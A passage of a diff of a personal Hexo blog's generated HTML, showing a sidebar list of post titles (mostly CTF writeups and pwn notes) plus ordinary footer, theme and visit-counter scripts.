href="../../../01/03/【汇编学习】mips 指令集/">【汇编学习】Mips 指令集</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/30/【WriteUp】kksctf open 2019--Pwn题解/">【WriteUp】#kksctf Open 2019--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/25/【WriteUp】攻防世界--Pwn题解(Part 3)/">【WriteUp】攻防世界--Pwn题解(Part 3)</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/25/【Pwn 笔记】函数中的宏常量定义/">【Pwn 笔记】函数中的宏常量定义</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/24/【WriteUp】第三届“华为杯”XMan冬令营选拔赛题解/">【WriteUp】第三届“华为杯”XMan冬令营选拔赛题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/16/【Pwn 笔记】格式化字符串总结/">【Pwn 笔记】格式化字符串总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/13/【WriteUp】攻防世界--Pwn题解(Part 2)/">【WriteUp】攻防世界--Pwn题解(Part 2)</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/11/18/【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解/">【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/11/05/【WriteUp】Hackme CTF--Pwn题解/">【WriteUp】Hackme CTF--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/11/03/【学习总结】Python沙箱逃逸/">【学习总结】Python沙箱逃逸</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/28/【Docker】Docker使用教程/">【Docker】Docker使用教程</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/28/【Docker】Docker安装教程/">【Docker】Docker安装教程</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/28/【WriteUp】RSCTF 2019 题解/">【WriteUp】RSCTF 2019 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/15/【Pwn 笔记】堆利用总结/">【Pwn 笔记】堆利用总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/14/【WriteUp】CryptixCTF'19 题解/">【WriteUp】CryptixCTF'19 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/05/【WriteUp】攻防世界--Pwn题解(Part 1)/">【WriteUp】攻防世界--Pwn题解(Part 1)</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/03/【WriteUp】MOCTF--web题解/">【WriteUp】MOCTF--Web题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/02/【杂项】一些网站汇总/">【杂项】一些网站汇总</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/28/【WriteUp】Newark Academy CTF 2019 题解/">【WriteUp】Newark Academy CTF 2019 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/24/【WriteUp】Jarvis OJ--Pwn题解/">【WriteUp】Jarvis OJ--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/19/【BugkuCTF】Pwn题解/">【BugkuCTF】Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/11/【杂项】C语言函数总结/">【杂项】C语言函数总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/10/【Pwn 笔记】堆利用总结--空闲块篇/">【Pwn 笔记】堆利用总结--空闲块篇</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/09/【Hexo】让Github Pages被索引到/">【Hexo】让Github Pages被索引到</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/09/【Hexo】更改Yelee主题内部文件为自己想要的样式/">【Hexo】更改Yelee主题内部文件为自己想要的样式</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/09/【Gem】gem安装教程/">【Gem】gem安装教程</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【TokyoWesterns CTF 5th 2019】Web--j2x2j/">【TokyoWesterns CTF 5th 2019】Web--J2x2j</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【TokyoWesterns CTF 5th 2019】Pwn--nothing more to say/">【TokyoWesterns CTF 5th 2019】Pwn--Nothing More to Say</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【TokyoWesterns CTF 5th 2019】Crypto--real-baby-rsa/">【TokyoWesterns CTF 5th 2019】Crypto--Real-Baby-Rsa</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【杂项】本人的CTF writeup模板/">【杂项】本人的CTF Writeup模板</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【TokyoWesterns CTF 5th 2019】Misc--Welcome!!/">【TokyoWesterns CTF 5th 2019】Misc--Welcome!!</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【Hexo】安装hexo的一系列组件-Step1/">【Hexo】安装hexo的一系列组件--Step1</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【Hexo】搭建博客时遇到的问题/">【Hexo】搭建博客时遇到的问题</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/07/【Npm】npm问题归总/">【Npm】npm问题汇总</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/07/【Hexo】搭建GitHub博客--Step2/">【Hexo】搭建GitHub博客--Step2</a></li></ul>
 
 
 
 
+
+
+
+
+
     <script>
+
         
+
     </script>
+
 </div>
+
       <footer id="footer">
+
     <div class="outer">
+
         <div id="footer-info">
+
             <div class="footer-left">
+
                 <i class="fa fa-copyright"></i> 
+
                 2019-2020 binLep
+
             </div>
+
             <div class="footer-right">
+
                 <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+
             </div>
+
         </div>
+
         
+
             <div class="visit">
+
                 
+
                     <span id="busuanzi_container_site_pv" style='display:none'>
+
                         <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+
                         </span>
+
                     </span>
+
                 
+
                 
+
                     <span>| </span>
+
                 
+
                 
+
                     <span id="busuanzi_container_page_pv" style='display:none'>
+
                         <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+
                         </span>
+
                     </span>
+
                 
+
             </div>
+
         
+
     </div>
+
 </footer>
+
     </div>
+
     
+
     <script src="../../../../js/GithubRepoWidget.js"></script>
 
-<script data-main="/js/main.js" src="//cdnjs.cloudflare.com/ajax/libs/require.js/2.2.0/require.min.js"></script>
+
+
+<script data-main="/old_blog_01/js/main.js" src="//cdnjs.cloudflare.com/ajax/libs/require.js/2.2.0/require.min.js"></script>
+
+
 
     <script>
+
         $(document).ready(function() {
+
             var iPad = window.navigator.userAgent.indexOf('iPad');
+
             if (iPad > -1 || $(".left-col").css("display") === "none") {
+
                 var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+
                 var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+
                 $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+
             }
+
             else {
+
                 var backgroundnum = 5;
+
                 var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+
                 $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+
             }
+
         })
+
     </script>
+
+
+
+
+
+
 
 
 
 
 
 <div class="scroll" id="scroll">
+
     <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+
     <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+
     <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+
 </div>
+
 <script>
+
     // Open in New Window
+
     
+
         var oOpenInNew = {
+
              github: ".github-widget a", 
+
              title: "a.article-title, .article-more-link a", 
+
              post: ".article-entry a[href], .copyright a[href]", 
+
              tags: ".article-tag a", 
+
              categories: ".article-category a, a.tag-list-link", 
+
              articleNav: "#article-nav a, #post-nav-button a", 
+
              archives: ".archive-article-title", 
+
              miniArchives: "a.post-list-link", 
+
              menu: ".header-menu a", 
+
              friends: "#js-friends a", 
+
              socail: ".social a" 
+
         }
+
         for (var x in oOpenInNew) {
+
             $(oOpenInNew[x]).attr("target", "_blank");
+
         }
+
     
+
 </script>
 
+
+
     <script>
+
         var originTitle = document.title;
+
         var titleTime;
+
         document.addEventListener("visibilitychange", function() {
+
             if (document.hidden) {
+
                 document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+
                 clearTimeout(titleTime);
+
             }
+
             else {
+
                 document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+
                 titleTime = setTimeout(function() {
+
                     document.title = originTitle;
+
                 }, 2000);
+
             }
+
         })
+
     </script>
 
+
+
 <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
   </div>
+
 </body>
+
 </html>
